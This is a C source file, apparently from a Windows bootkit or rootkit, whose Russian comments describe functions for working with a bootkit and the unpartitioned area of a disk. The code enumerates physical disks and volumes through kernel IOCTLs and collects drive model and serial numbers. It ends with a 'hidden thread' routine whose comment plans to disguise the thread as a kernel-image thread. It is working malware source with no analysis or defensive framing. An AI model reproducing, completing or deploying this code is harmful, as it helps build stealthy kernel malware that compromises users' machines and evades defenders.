// функции для работы с буткитом и неразмеченной областью диска.

#define FILE_DEVICE_DISK                0x00000007
#define FILE_DEVICE_MASS_STORAGE 0x0000002d

#define IOCTL_DISK_BASE                 FILE_DEVICE_DISK
#define IOCTL_DISK_GET_DRIVE_GEOMETRY   CTL_CODE(IOCTL_DISK_BASE, 0x0000, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_GET_PARTITION_INFO   CTL_CODE(IOCTL_DISK_BASE, 0x0001, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_STORAGE_BASE FILE_DEVICE_MASS_STORAGE
// New IOCTLs for GUID Partition tabled disks.
#define IOCTL_DISK_GET_DRIVE_GEOMETRY_EX    CTL_CODE(IOCTL_DISK_BASE, 0x0028, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_STORAGE_GET_DEVICE_NUMBER       CTL_CODE(IOCTL_STORAGE_BASE, 0x0420, METHOD_BUFFERED, FILE_ANY_ACCESS)


#define IOCTL_SCSI_BASE                 FILE_DEVICE_CONTROLLER
#define IOCTL_SCSI_GET_ADDRESS          CTL_CODE(IOCTL_SCSI_BASE, 0x0406, METHOD_BUFFERED, FILE_ANY_ACCESS)

#include <pshpack1.h>
typedef struct _MY_QUERY_DIRECTORY_STRUCT {
    ulong_t    Index;
    ulong_t    Retlen;
    char    Buffer[0x200];
}MY_QUERY_DIRECTORY_STRUCT,*PMY_QUERY_DIRECTORY_STRUCT;

typedef struct _OBJECT_NAMETYPE_INFO {
    UNICODE_STRING ObjectName;
    UNICODE_STRING ObjectType;
}OBJECT_NAMETYPE_INFO, *POBJECT_NAMETYPE_INFO;
#include <poppack.h>

#define QUERY_DIRECTORY_BUFF_SIZE 0x200

#define SMART_RCV_DRIVE_DATA CTL_CODE(IOCTL_DISK_BASE, 0x0022, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IDE_ATA_IDENTIFY 0xEC // Returns ID sector for ATA.


//
// Input structure for IOCTL_MOUNTMGR_DELETE_POINTS,
// IOCTL_MOUNTMGR_QUERY_POINTS, and IOCTL_MOUNTMGR_DELETE_POINTS_DBONLY.
//

typedef struct _MOUNTMGR_MOUNT_POINT {
    ulong_t   SymbolicLinkNameOffset;
    uint16_t  SymbolicLinkNameLength;
    ulong_t   UniqueIdOffset;
    uint16_t  UniqueIdLength;
    ulong_t   DeviceNameOffset;
    uint16_t  DeviceNameLength;
} MOUNTMGR_MOUNT_POINT, *PMOUNTMGR_MOUNT_POINT;

//
// Output structure for IOCTL_MOUNTMGR_DELETE_POINTS,
// IOCTL_MOUNTMGR_QUERY_POINTS, and IOCTL_MOUNTMGR_DELETE_POINTS_DBONLY.
//

typedef struct _MOUNTMGR_MOUNT_POINTS {
    ulong_t                   Size;
    ulong_t                   NumberOfMountPoints;
    MOUNTMGR_MOUNT_POINT    MountPoints[1];
} MOUNTMGR_MOUNT_POINTS, *PMOUNTMGR_MOUNT_POINTS;

#define MOUNTMGRCONTROLTYPE                         0x0000006D // 'm'

// These are the IOCTLs supported by the mount point manager.
#define IOCTL_MOUNTMGR_QUERY_POINTS                 CTL_CODE(MOUNTMGRCONTROLTYPE, 2, METHOD_BUFFERED, FILE_ANY_ACCESS)

#pragma pack(1)

typedef struct _GETVERSIONINPARAMS
{
    uint8_t bVersion;               // Binary driver version.
    uint8_t bRevision;              // Binary driver revision.
    uint8_t bReserved;              // Not used.
    uint8_t bIDEDeviceMap;          // Bit map of IDE devices.
    ulong_t fCapabilities;          // Bit mask of driver capabilities.
    ulong_t dwReserved[4];          // For future use.
} GETVERSIONINPARAMS, *PGETVERSIONINPARAMS, *LPGETVERSIONINPARAMS;

typedef struct _IDEREGS
{
    uint8_t bFeaturesReg;           // Used for specifying SMART "commands".
    uint8_t bSectorCountReg;        // IDE sector count register
    uint8_t bSectorNumberReg;       // IDE sector number register
    uint8_t bCylLowReg;             // IDE low order cylinder value
    uint8_t bCylHighReg;            // IDE high order cylinder value
    uint8_t bDriveHeadReg;          // IDE drive/head register
    uint8_t bCommandReg;            // Actual IDE command.
    uint8_t bReserved;                      // reserved for future use.  Must be zero.
} IDEREGS, *PIDEREGS, *LPIDEREGS;

typedef struct _SENDCMDINPARAMS
{
    ulong_t cBufferSize;
    IDEREGS irDriveRegs;
    UCHAR bDriveNumber;
    UCHAR bReserved[3];
    ulong_t dwReserved[4];
    UCHAR bBuffer[1];
} SENDCMDINPARAMS, *PSENDCMDINPARAMS, *LPSENDCMDINPARAMS;


typedef struct _DRIVERSTATUS
{
    uint8_t bDriverError;           // Error code from driver,
    // or 0 if no error.
    uint8_t bIDEError;                      // Contents of IDE Error register.
    // Only valid when bDriverError
    // is SMART_IDE_ERROR.
    uint8_t bReserved[2];           // Reserved for future expansion.
    DWORD dwReserved[2];          // Reserved for future expansion.
} DRIVERSTATUS, *PDRIVERSTATUS, *LPDRIVERSTATUS;

typedef struct _SENDCMDOUTPARAMS {
    DWORD cBufferSize;            // Size of bBuffer in bytes
    DRIVERSTATUS DriverStatus;           // Driver status structure.
    uint8_t bBuffer[1];             // Buffer of arbitrary length in which to store the data read from the                                                                                  // drive.
} SENDCMDOUTPARAMS, *PSENDCMDOUTPARAMS, *LPSENDCMDOUTPARAMS;

#pragma pack()

//
// IOCTL_STORAGE_GET_DEVICE_NUMBER
//
// input - none
//
// output - STORAGE_DEVICE_NUMBER structure
//          The values in the STORAGE_DEVICE_NUMBER structure are guaranteed
//          to remain unchanged until the system is rebooted.  They are not
//          guaranteed to be persistant across boots.
//

typedef struct _STORAGE_DEVICE_NUMBER {

    //
    // The FILE_DEVICE_XXX type for this device.
    //

    DEVICE_TYPE DeviceType;

    //
    // The number of this device
    //

    DWORD       DeviceNumber;

    //
    // If the device is partitionable, the partition number of the device.
    // Otherwise -1
    //

    DWORD       PartitionNumber;
} STORAGE_DEVICE_NUMBER, *PSTORAGE_DEVICE_NUMBER;

PDEVICE_OBJECT common_dio_det_device_by_name(wchar_t* devName)
{
    PDEVICE_OBJECT pDevice = NULL;
    PFILE_OBJECT pFileObject;
    NTSTATUS ntStatus;
    HANDLE devHandle;
    OBJECT_ATTRIBUTES ObjAttr;
    IO_STATUS_BLOCK ioStatus;
    UNICODE_STRING ObjectName;
    USE_GLOBAL_BLOCK;

    pGlobalBlock->pCommonBlock->fnRtlInitUnicodeString(&ObjectName, devName);

    InitializeObjectAttributes(&ObjAttr, &ObjectName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ntStatus = pGlobalBlock->pCommonBlock->fnZwCreateFile(&devHandle, SYNCHRONIZE | FILE_ANY_ACCESS, &ObjAttr, &ioStatus, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (NT_SUCCESS(ntStatus)) {
        ntStatus = pGlobalBlock->pCommonBlock->fnObReferenceObjectByHandle(devHandle, STANDARD_RIGHTS_REQUIRED, NULL, KernelMode, (VOID**)&pFileObject, NULL);
        if (NT_SUCCESS(ntStatus)) {
            if (pFileObject->DeviceObject != NULL) {
                pDevice = pFileObject->DeviceObject;

                if (pDevice->Vpb != NULL) {
                    if (pDevice->Vpb->RealDevice != NULL)
                        pDevice = pDevice->Vpb->RealDevice;
                }

                if (pDevice->Flags & DO_DEVICE_INITIALIZING) {
                    pDevice = NULL;
                }
                else {
                    if (!NT_SUCCESS(pGlobalBlock->pCommonBlock->fnObReferenceObjectByPointer(pDevice, STANDARD_RIGHTS_REQUIRED, *pGlobalBlock->pCommonBlock->pIoDeviceObjectType, KernelMode)))
                        pDevice = NULL;
                }
            }
            pGlobalBlock->pCommonBlock->fnObfDereferenceObject(pFileObject);
        }
        pGlobalBlock->pCommonBlock->fnZwClose(devHandle);
    }

    return pDevice;
}

NTSTATUS common_dio_get_volume_info(PDEVICE_OBJECT pDevice, uint32_t ctrlCode, uint8_t* pBuffer, uint32_t bufSize)
{
    NTSTATUS ntStatus;
    PIRP pIrp;
    PIO_STACK_LOCATION irpStack;
    KEVENT event;    
    IO_STATUS_BLOCK ioStatus;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pCommonBlock->fnKeInitializeEvent(&event, NotificationEvent, FALSE);

    pIrp = pGlobalBlock->pCommonBlock->fnIoBuildDeviceIoControlRequest(ctrlCode, pDevice, NULL, 0, pBuffer, bufSize, FALSE, &event, &ioStatus);

    if (pIrp == NULL) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    irpStack = pIrp->Tail.Overlay.CurrentStackLocation - 1; // IoGetNextIrpStackLocation(pIrp);
    irpStack->Flags |= SL_OVERRIDE_VERIFY_VOLUME;

    ntStatus = pGlobalBlock->pCommonBlock->fnIofCallDriver(pDevice, pIrp);

    if (ntStatus == STATUS_PENDING) {
        pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(&event, Executive, KernelMode, FALSE, (PLARGE_INTEGER)NULL);
        ntStatus = ioStatus.Status;
    }

    if (NT_SUCCESS(ntStatus) && !ioStatus.Information) {
        ntStatus = STATUS_UNSUCCESSFUL;
        DbgBreakPoint();
    }

    return ntStatus;
}

void common_change_byte_order(PCHAR szString, uint16_t uscStrSize)
{
    uint16_t i;
    char temp;

    for (i = 0; i < uscStrSize; i+=2) {
        temp = szString[i];
        szString[i] = szString[i+1];
        szString[i+1] = temp;
    }
}

NTSTATUS common_dio_identify_disk(pdisk_info_t pDiskInfo)
{
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    PSENDCMDINPARAMS pSCIP;
    PSENDCMDOUTPARAMS pSCOP;
    PIRP Irp;
    IO_STATUS_BLOCK ioStatus;
    KEVENT evt;
    USE_GLOBAL_BLOCK


    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pSCIP, sizeof(SENDCMDINPARAMS) - 1, NonPagedPool);
    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pSCOP, sizeof(SENDCMDOUTPARAMS) + sizeof(disk_id_info_t) - 1, NonPagedPool);

    pGlobalBlock->pCommonBlock->fnKeInitializeEvent(&evt, NotificationEvent, FALSE);

    pSCIP->irDriveRegs.bCommandReg = IDE_ATA_IDENTIFY;
    pSCOP->cBufferSize = sizeof(disk_id_info_t);

    if (Irp = pGlobalBlock->pCommonBlock->fnIoBuildDeviceIoControlRequest(SMART_RCV_DRIVE_DATA, pDiskInfo->pDeviceObject, pSCIP, sizeof(SENDCMDINPARAMS) - 1, pSCOP, sizeof(SENDCMDOUTPARAMS) + sizeof(disk_id_info_t) - 1, FALSE, &evt, &ioStatus)) {
        ntStatus = pGlobalBlock->pCommonBlock->fnIofCallDriver(pDiskInfo->pDeviceObject, Irp);
        if(ntStatus == STATUS_PENDING) {
            pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(&evt, Suspended, KernelMode, FALSE, NULL);
            ntStatus = ioStatus.Status;
        }

        if (NT_SUCCESS(ntStatus) && !ioStatus.Information) {
            ntStatus = STATUS_UNSUCCESSFUL;
        }

        if (NT_SUCCESS(ntStatus)) {
            pdisk_id_info_t pinfo = (pdisk_id_info_t)pSCOP->bBuffer;

            pGlobalBlock->pCommonBlock->fncommon_change_byte_order(pinfo->sModelNumber, sizeof(pinfo->sModelNumber));
            pGlobalBlock->pCommonBlock->fncommon_change_byte_order(pinfo->sFirmwareRev, sizeof(pinfo->sFirmwareRev));
            pGlobalBlock->pCommonBlock->fncommon_change_byte_order(pinfo->sSerialNumber, sizeof(pinfo->sSerialNumber));

            pGlobalBlock->pCommonBlock->fnmemcpy(pDiskInfo->modelNumber, pinfo->sModelNumber, sizeof(pinfo->sModelNumber));
            pGlobalBlock->pCommonBlock->fnmemcpy(pDiskInfo->firmwareRev, pinfo->sFirmwareRev, sizeof(pinfo->sFirmwareRev));
            pGlobalBlock->pCommonBlock->fnmemcpy(pDiskInfo->serialNumber, pinfo->sSerialNumber, sizeof(pinfo->sSerialNumber));

            pGlobalBlock->pCommonBlock->fnmemcpy(&pDiskInfo->idInfo, pinfo, sizeof(disk_id_info_t));
        }
    }

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pSCOP, LOADER_TAG);
    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pSCIP, LOADER_TAG);

    return ntStatus;
}


//
// Only send polling irp when device is fully powered up and a
// power down irp is not in progress.
//
// NOTE:   This helps close a window in time where a polling irp could cause
//         a drive to spin up right after it has powered down. The problem is
//         that SCSIPORT, ATAPI and SBP2 will be in the process of powering
//         down (which may take a few seconds), but won't know that. It would
//         then get a polling irp which will be put into its queue since it
//         the disk isn't powered down yet. Once the disk is powered down it
//         will find the polling irp in the queue and then power up the
//         device to do the poll. They do not want to check if the polling
//         irp has the SRB_NO_KEEP_AWAKE flag here since it is in a critical
//         path and would slow down all I/Os. A better way to fix this
//         would be to serialize the polling and power down irps so that
//         only one of them is sent to the device at a time.
//
#define ClasspCanSendPollingIrp(fdoExtension)                           \
    ((fdoExtension->DevicePowerState == PowerDeviceD0) &&  \
    (! fdoExtension->PowerDownInProgress) )


PDEVICE_OBJECT common_dio_get_device_object_by_name(wchar_t* deviceName, uint32_t devNameLen, pvolume_info_t pVolumeInfo)
{
    PDEVICE_OBJECT pVolumeDevice = NULL;
    NTSTATUS ntStatus;
    IO_STATUS_BLOCK ioStatus;
    STORAGE_DEVICE_NUMBER stDevNum;
    pdisk_info_t pDiskInfo = NULL;
    wchar_t* drvName;
    wchar_t devName[24];
    USE_GLOBAL_BLOCK

    if (pGlobalBlock->pCommonBlock->fnRtlCompareMemory(deviceName, pGlobalBlock->pCommonBlock->partPrefix, 16 * sizeof(wchar_t)) == 16 * sizeof(wchar_t)) {
        if (devNameLen < sizeof(pVolumeInfo->devName) / sizeof(wchar_t)) {
            pGlobalBlock->pCommonBlock->fnmemset(pVolumeInfo->devName, 0, sizeof(pVolumeInfo->devName));
            pGlobalBlock->pCommonBlock->fnmemcpy(pVolumeInfo->devName, deviceName, devNameLen * sizeof(wchar_t));

            pVolumeDevice = pGlobalBlock->pCommonBlock->fncommon_dio_det_device_by_name(pVolumeInfo->devName);
            if (pVolumeDevice != NULL) {
                pGlobalBlock->pCommonBlock->fncommon_dio_get_volume_info(pVolumeDevice, IOCTL_DISK_GET_PARTITION_INFO, (uint8_t*)&pVolumeInfo->parInfo, sizeof(pVolumeInfo->parInfo));
                pGlobalBlock->pCommonBlock->fncommon_dio_get_volume_info(pVolumeDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, (uint8_t*)&pVolumeInfo->geometry, sizeof(pVolumeInfo->geometry));

                if (pGlobalBlock->pCommonBlock->fncommon_dio_get_volume_info(pVolumeDevice, IOCTL_STORAGE_GET_DEVICE_NUMBER, (uint8_t*)&stDevNum, sizeof(stDevNum)) == STATUS_SUCCESS) {
                    uint8_t counter = 0, number = (uint8_t)stDevNum.DeviceNumber;
                    PDEVICE_OBJECT pDiskDevice;
                    
                    pGlobalBlock->pCommonBlock->fnmemset(devName, 0, sizeof(devName));
                    pGlobalBlock->pCommonBlock->fncommon_wcscpy_s(devName, 24, pGlobalBlock->pCommonBlock->partPrefix);
                    drvName = devName + pGlobalBlock->pCommonBlock->fncommon_wcslen_s(devName, 24);

                    for ( ; ; ++counter) {
                        if (number < 10) {
                            *drvName++ = L'0' + number;
                        }
                        else {
                            number -= 10;
                            *drvName++ = L'1';
                            *drvName++ = L'0' + number;
                        }

                        if (counter > 0) {
                            break;
                        }

                        *drvName++ = '\\';
                        *(uint32_t*)drvName = 0x00520044; drvName += 2;
                    }
                    
                    pDiskDevice = pGlobalBlock->pCommonBlock->fncommon_dio_det_device_by_name(devName);

                    if (pDiskDevice != NULL) {
                        pdisk_list_entry_t pDiskListEntry;
                        pvolume_list_entry_t pVolumeListEntry;
                        bool_t newHD = TRUE;
                        DISK_GEOMETRY diskGeom;

                        if (pGlobalBlock->pCommonBlock->pDisksListHead != NULL) {
                            // Ищем диск в списке найденных ранее дисков.
                            pDiskListEntry = pGlobalBlock->pCommonBlock->pDisksListHead;
                            do {                                    
                                if (pDiskListEntry->pDiskInfo->pDeviceObject == pDiskDevice) {
                                    newHD = FALSE;
                                    break;
                                }
                                pDiskListEntry = (pdisk_list_entry_t)((PLIST_ENTRY)pDiskListEntry)->Flink;
                            } while (pDiskListEntry != pGlobalBlock->pCommonBlock->pDisksListHead);
                        }
                        
                        if (newHD) {
                            KEVENT event;
                            PDEVICE_OBJECT topOfStack;
                            PIRP pIrp = NULL;
                            //PFUNCTIONAL_DEVICE_EXTENSION fdoExtension = DeviceObject->DeviceExtension;

                            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pDiskInfo, sizeof(disk_info_t), NonPagedPool);
                            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pDiskListEntry, sizeof(disk_list_entry_t), NonPagedPool);
                            pDiskListEntry->pDiskInfo = pDiskInfo;
                            pGlobalBlock->pCommonBlock->fncommon_wcscpy_s(pDiskInfo->devName, 24, devName);
                            pDiskInfo->pDeviceObject = pDiskDevice;
                            // Создаём объект описывающий физический диск.
                            if (pGlobalBlock->pCommonBlock->pDisksListHead == NULL) {                
                                pGlobalBlock->pCommonBlock->fncommon_initialize_list_head((PLIST_ENTRY)pDiskListEntry);
                                pGlobalBlock->pCommonBlock->pDisksListHead = pDiskListEntry;
                            }
                            else {
                                pGlobalBlock->pCommonBlock->fncommon_insert_tail_list((PLIST_ENTRY)pGlobalBlock->pCommonBlock->pDisksListHead, (PLIST_ENTRY)pDiskListEntry);
                            }

                            if (pGlobalBlock->pCommonBlock->fncommon_dio_get_volume_info(pDiskDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, (uint8_t*)&diskGeom, sizeof(diskGeom)) == STATUS_SUCCESS) {
                                pDiskInfo->bytesPerSector = diskGeom.BytesPerSector;
                                pDiskInfo->sectorsPerCyl = diskGeom.TracksPerCylinder * diskGeom.SectorsPerTrack;
    #ifdef _WIN64
                                pDiskInfo->totalSectors = diskGeom.Cylinders.QuadPart * (uint64_t)pDiskInfo->sectorsPerCyl * (uint64_t)pDiskInfo->bytesPerSector;
    #else
                                pDiskInfo->totalSectors = pGlobalBlock->pCommonBlock->fn_allmul(diskGeom.Cylinders.QuadPart, pGlobalBlock->pCommonBlock->fn_allmul((uint64_t)pDiskInfo->sectorsPerCyl, (uint64_t)pDiskInfo->bytesPerSector));
    #endif // _WIN64
                            }

                            pDiskInfo->sizeInSectors = pGlobalBlock->pCommonBlock->fncommon_dio_get_disk_size(pDiskInfo, 1);
                            pGlobalBlock->pCommonBlock->fncommon_dio_identify_disk(pDiskInfo);

                            // Получаем информацию о нижнем драйвере.
                            pDiskInfo->pLowerDevice = pGlobalBlock->pCommonBlock->fnIoGetDeviceAttachmentBaseRef(pDiskDevice);
                            topOfStack = pGlobalBlock->pCommonBlock->fnIoGetAttachedDeviceReference(pDiskDevice);

                            pGlobalBlock->pCommonBlock->fnKeInitializeEvent(&event, SynchronizationEvent, FALSE);
                            pIrp = pGlobalBlock->pCommonBlock->fnIoBuildDeviceIoControlRequest(IOCTL_SCSI_GET_ADDRESS, topOfStack, NULL,
                                0, &pDiskInfo->scsiAddress, sizeof(scsi_address_t), FALSE, &event, &ioStatus);

                            if (pIrp != NULL) {
                                ntStatus = pGlobalBlock->pCommonBlock->fnIofCallDriver(topOfStack, pIrp);
                                if (ntStatus == STATUS_PENDING) {
                                    pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
                                }
                            }

                            pGlobalBlock->pCommonBlock->fnObfDereferenceObject(topOfStack);
                        }
                        else {
                            pDiskInfo = pDiskListEntry->pDiskInfo;
                        }

                        pVolumeInfo->pDiskInfo = pDiskInfo;

                        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pVolumeListEntry, sizeof(volume_list_entry_t), NonPagedPool);
                        pVolumeListEntry->pVolumeInfo = pVolumeInfo;
                        
                        // Добавляем том в список для родительского диска.
                        if (pDiskInfo->pVolumeListHead == NULL) {
                            pGlobalBlock->pCommonBlock->fncommon_initialize_list_head((PLIST_ENTRY)pVolumeListEntry);
                            pDiskInfo->pVolumeListHead = pVolumeListEntry;
                        }
                        else {
                            pGlobalBlock->pCommonBlock->fncommon_insert_tail_list((PLIST_ENTRY)pDiskInfo->pVolumeListHead, (PLIST_ENTRY)pVolumeListEntry);
                        }
                    }
                }
            }
        }
    }
    return pVolumeDevice;
}

bool_t common_create_hidden_thread(PKSTART_ROUTINE startRoutine, pvoid_t pParam)
{
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES fObjectAttributes;
    USE_GLOBAL_BLOCK

    // Пока, лучший вариант который пришёл в голову базируется на поиске адреса потока, который встречается чаще всего списке потоков системы
    // принадлежащих образу ядра системы.

    InitializeObjectAttributes(&fObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    pGlobalBlock->pCommonBlock->fnPsCreateSystemThread(&hThread, /*0x001F03FF*/THREAD_ALL_ACCESS, &fObjectAttributes, 0, 0, startRoutine, pParam);

    return TRUE;
}
